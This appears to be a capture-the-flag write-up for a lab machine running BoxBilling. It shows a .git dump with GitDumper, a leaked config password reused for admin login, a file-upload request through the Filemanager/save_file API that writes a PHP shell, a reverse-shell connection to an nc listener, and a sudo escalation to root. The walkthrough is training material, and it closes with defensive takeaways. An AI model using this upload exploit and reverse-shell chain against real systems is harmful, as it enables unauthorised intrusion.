#Linux #git #GitDumper #BoxBilling #FileUpload #RCE #sudo #credentialhunting

## Overview

BullyBox is a Linux web box running BoxBilling, a PHP billing platform. The site redirects to `bullybox.local`, and directory brute force reveals a `.git` folder that is forbidden at the browser but extractable with GitDumper. Inside the dumped repository, `bb-config.php` contains the database password, which doubles as the admin panel credential. BoxBilling's authenticated file manager accepts PHP uploads through its API, landing a shell as `yuki`. That user has unconstrained `sudo` rights, making privilege escalation trivial.

## Recon

### Nmap

```sh
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
```

The page at the IP fails to load and redirects to `http://bullybox.local/`. After adding that to `/etc/hosts`, it resolves to a BoxBilling storefront.

### Discovering the Exposed .git Directory

Direct browser access to `/.git/` returns 403 Forbidden, Apache blocks directory listing but the files are still served individually. That's enough for GitDumper:

```sh
python3 git_dumper.py http://bullybox.local/.git/ ./bully
```

> **Why a forbidden .git still leaks code:** Apache's 403 blocks index listing, but individual file paths like `/.git/config`, `/.git/HEAD`, and pack files are still readable. GitDumper reconstructs the full repository tree by crawling known git object paths. Any committed file becomes recoverable, including configs with secrets.

## Foothold

### Credentials in bb-config.php

Inside the dumped repository, `bb-config.php` holds the database configuration in plaintext:

```php
'type'     => 'mysql',
'host'     => 'localhost',
'name'     => 'boxbilling',
'user'     => 'admin',
'password' => 'Playing-Unstylish7-Provided',
```

The comment in `bb-config-sample.php` points to the admin panel path:

```
http://www.yourdomain.com/index.php?_url=/bb-admin
```

Logging into `/bb-admin` with `admin@bullybox.local:Playing-Unstylish7-Provided` succeeds.

### PHP Webshell via the File Manager API

BoxBilling exposes a `Filemanager/save_file` endpoint that authenticated admins can call directly. The endpoint writes arbitrary content to a specified path:

```http
POST /index.php?_url=/api/admin/Filemanager/save_file HTTP/1.1
Host: bullybox.local
Cookie: PHPSESSID=8f22hpf0mgvb1jqr5a68m6pkcs
Content-Type: application/x-www-form-urlencoded

order_id=1&path=ax.php&data=<%3fphp+phpinfo()%3b%3f>
```

Visiting `http://bullybox.local/ax.php` returns a phpinfo page, confirming write access to the web root.

> **Why this works:** the file manager API validates the session token but places no restriction on file extension or content. Passing `path=shell.php` with a URL-encoded PHP reverse shell in `data` writes an executable .php file directly into the document root.

The same request with the Ivan Sincek PHP reverse shell payload in `data` (URL-encoded) and `path=shell.php` lands a shell on port 80:

```sh
rlwrap nc -lvnp 80
connect to [192.168.45.244] from (UNKNOWN) [192.168.180.27] 52730
SOCKET: Shell has connected! PID: 2136

whoami
yuki
```

Upgrade to TTY:

```sh
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

## Privilege Escalation

### Unconstrained sudo

`sudo -l` shows the full picture immediately:

```sh
yuki@bullybox:/tmp$ sudo -l
User yuki may run the following commands on bullybox:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: ALL
```

`yuki` can run anything as any user without a password.

## Root

```sh
yuki@bullybox:/tmp$ sudo /bin/bash
root@bullybox:/tmp# whoami
root
```

```sh
root@bullybox:~# cat proof.txt
‹redacted›
```

## Takeaways

- **A 403 on `.git/` is not protection.** GitDumper extracts full source code from individually accessible objects. Check for `.git` on every engagement and treat a 403 response as "likely recoverable, not blocked."
- **Config files committed to git are permanent liabilities.** Even after a repo is cleaned up, secrets in git history persist. Here the live config file was committed as-is.
- **Always check `sudo -l` immediately after foothold.** Completely unrestricted sudo is rare, but it costs one command to verify and ends the engagement on the spot.
